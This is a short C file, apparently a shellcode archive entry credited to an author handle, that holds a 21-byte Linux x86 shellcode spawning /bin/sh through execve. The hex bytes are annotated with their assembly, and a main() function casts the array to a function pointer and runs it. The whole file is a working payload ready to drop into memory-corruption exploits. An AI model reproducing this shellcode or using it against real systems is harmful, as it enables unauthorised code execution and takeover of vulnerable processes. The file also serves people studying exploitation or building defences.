/*
 * (linux/x86) execve("/bin/sh",0,0)
 * 21 bytes
 *
 * http://www.gonullyourself.org
 * sToRm <hixmostorm@hotmail.com>
 */

char shellcode[] =
                                // <_start>
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\xf7\xe1"                  // mul    %ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\xcd\x80"                  // int    $0x80
;

int main() {

    int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();

}